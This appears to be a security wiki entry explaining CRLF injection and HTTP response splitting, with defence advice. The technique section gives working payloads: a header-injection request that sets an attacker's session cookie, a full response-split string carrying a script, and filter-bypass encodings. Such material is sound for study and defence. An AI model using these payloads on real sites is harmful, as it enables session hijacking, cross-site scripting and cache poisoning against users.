---
title: CRLF injection / HTTP response splitting
slug: crlf-injection
---

> **TL;DR:** %0d%0a in user input breaks out of headers — split responses, set cookies, plant XSS, poison caches.

## What it is
HTTP separates headers from the body with `\r\n\r\n` (CRLFCRLF). If user input is concatenated into a response header without sanitisation, the attacker can inject `\r\n` to terminate the current header and start arbitrary new ones — including a `Set-Cookie`, a `Location` redirect, or a completely fabricated second response. The latter is called response splitting and lets an upstream cache store the attacker's response under the legitimate URL.

## Preconditions / where it applies
- Input reflected into a response header: `Location:` from redirect param, `Set-Cookie:` from preferences, custom `X-…:` from API
- Backend that does not strip `\r`, `\n`, or their URL-encoded forms
- Useful targets: any HTTP/1.1 hop — older Node, Python wsgi, Java servlet containers historically allowed raw CRLF in header setters
- HTTP/2 generally immune to splitting (binary framing) — but the gateway translating h2→h1 can re-introduce it

## Technique
Find the sink first — any param that ends up in a response header. Then inject:

```
GET /redirect?url=https://x/%0d%0aSet-Cookie:%20session=attacker%0d%0a HTTP/1.1
Host: target
```

Response becomes:

```
HTTP/1.1 302 Found
Location: https://x/
Set-Cookie: session=attacker

```

Full response split (older servers):

```
?param=foo%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

Encoded variants when filters block `%0d%0a`: `%E5%98%8A%E5%98%8D` (overlong UTF-8 that some decoders fold to CR/LF), `
` in JSON contexts, bare `\n` (LF only) — many servers accept LF as line terminator.

Combine with [[cache-poisoning]]: a CRLF-poisoned response stored by Varnish/Cloudflare serves the malicious body to every subsequent visitor.

## Detection and defence
- Reject any `\r` or `\n` (and their encodings) in values destined for header construction — fail closed
- Use framework-provided header-setting APIs that validate (e.g. modern Node throws `ERR_INVALID_CHAR`)
- Log responses with abnormal header counts or with bodies that start with `HTTP/1.`
- WAF rules for `%0d%0a`, `%0a`, `\r\n`, `
` in URL parameters
- Cache layers should reject upstream responses with unexpected `Content-Length` mismatch

## References
- [OWASP — CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) — definition and impact
- [PortSwigger — HTTP response splitting](https://portswigger.net/kb/issues/00200200_http-response-header-injection) — Burp issue notes
- [HackTricks — CRLF / HTTP response splitting](https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html) — payloads
